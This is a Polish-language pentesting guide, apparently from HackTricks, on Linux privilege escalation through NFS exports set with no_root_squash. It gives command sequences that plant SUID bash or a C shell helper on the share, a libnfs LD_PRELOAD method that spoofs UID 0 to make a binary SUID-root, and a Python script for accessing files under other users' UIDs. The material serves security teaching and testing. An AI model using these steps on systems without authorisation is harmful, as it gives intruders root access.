# Podniesienie uprawnień przez błędną konfigurację NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje o squashing

W przypadku NFS AUTH_SYS/AUTH_UNIX serwer opiera sprawdzanie uprawnień do plików na wartościach `uid` i `gid` przesyłanych w każdym żądaniu RPC. Inne security flavors, takie jak Kerberos, używają innych danych uwierzytelniających, a serwer może mapować numeryczne dane uwierzytelniające przed sprawdzeniem uprawnień.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Mapuje każdy UID i GID na konto anonymous, które w systemie Linux domyślnie jest kontem `nobody` (65534). `no_all_squash` jest wartością domyślną dla żądań innych niż root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Jest to wartość domyślna w systemie Linux i mapuje żądania z UID/GID 0 (root) na konto anonymous; pozostałe UID i GID nie są poddawane squashingowi.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Wyłącza root squashing, dzięki czemu żądania z UID/GID 0 mogą być traktowane na serwerze jako żądania użytkownika root.<sup>[[4]](#references)</sup>

Jeśli dozwolony klient może zamontować zapisywalny export w **`/etc/exports`** skonfigurowany z **`no_root_squash`**, jego żądania z UID/GID 0 mogą zapisywać w tym miejscu jako użytkownik root serwera.<sup>[[4]](#references)</sup>

Więcej informacji o **NFS** znajdziesz tutaj:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Podniesienie uprawnień

### Remote Exploit

Opcja 1 z użyciem bash:
- Na dozwolonym kliencie zamontuj zapisywalny export jako root, skopiuj do niego **`/bin/bash`**, ustaw jego bit **SUID** i uruchom go z poziomu mounta ofiary, który nie używa `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
- Aby przesłany plik pozostał własnością root, serwer musi używać **`no_root_squash`**. Jeśli root jest poddawany squashingowi, binarny plik SUID dla innego konta jest możliwy tylko wtedy, gdy klient może legalnie utworzyć go lub stać się jego właścicielem przy użyciu numerycznego UID/GID tego konta.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Opcja 2 z użyciem skompilowanego kodu C:
- Zamontuj katalog z dozwolonego klienta, skopiuj do niego skompilowany payload wykorzystujący uprawnienia SUID, ustaw jego bit **SUID** i wykonaj go na ofierze (zobacz [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Te same ograniczenia co wcześniej
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Pamiętaj, że jeśli możesz utworzyć **tunnel z własnej maszyny do maszyny ofiary, nadal możesz użyć wersji Remote do wykorzystania tego privilege escalation, wykonując tunnelling wymaganych portów**.\
> Poniższy trik jest przydatny, gdy `/etc/exports` ogranicza export do adresu IP ofiary: zdalny klient nie może go zamontować, ale lokalna technika może działać przez share już zamontowany na dozwolonym hoście.<sup>[[2]](#references)</sup>\
> W przypadku tej nieuprzywilejowanej metody libnfs export w **`/etc/exports`** musi używać flagi `insecure`, aby proces mógł używać niezarezerwowanego portu źródłowego; `secure` jest wartością domyślną, chociaż proces, który może zbindować zarezerwowany port, nie potrzebuje tej opcji.<sup>[[1]](#references)[[4]](#references)</sup>

### Podstawowe informacje

Klient NFSv3 AUTH_UNIX dołącza swój efektywny UID, GID oraz grupy do każdego wywołania, a serwer używa ich podczas sprawdzania uprawnień. Ta lokalna technika wykorzystuje ten model, fałszując dane uwierzytelniające RPC za pomocą [libnfs](https://github.com/sahlberg/libnfs); jego moduł preload obsługuje nadpisywanie UID/GID w kontekście NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kompilowanie biblioteki

Przykład libnfs może wymagać dostosowania do docelowego kernela; w wykorzystanym walkthrough wyraźnie zaznaczono, że przed skompilowaniem modułu preload należy zakomentować wywołania systemowe fallocate.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Przeprowadzanie Exploitu

Przykład tworzy mały helper w C, który uruchamia shell, następnie umieszcza go na share i używa `ld_nfs.so` z UID 0 w kontekście NFS, aby nadać mu uprawnienia SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Skompiluj kod exploita:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Umieść exploit na share i zmodyfikuj jego uprawnienia, fałszując UID**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Wykonaj exploit, aby uzyskać uprawnienia root**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell do Stealthy File Access

Po uzyskaniu dostępu root ten wzorzec `nfsh.py` ustawia efektywny UID na UID użytkownika docelowego pliku przed uruchomieniem polecenia, umożliwiając dostęp bez rekurencyjnej zmiany właściciela.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Uruchom tak:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Opowieść o mniej znanym NFS privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — strona podręcznika Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Specyfikacja protokołu NFS w wersji 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
